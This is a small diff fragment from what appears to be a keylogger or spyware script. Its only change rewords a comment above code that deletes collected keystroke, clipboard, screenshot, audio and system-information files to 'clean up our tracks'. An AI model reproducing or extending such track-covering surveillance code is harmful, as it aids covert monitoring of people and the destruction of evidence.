@@ -231,7 +231,7 @@ for encrypting_file in files_to_encrypt:
 
 time.sleep(120)
 
-# Clean up our Tracks and Delete Files
+# Cleaning up our Tracks and Delete Files
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
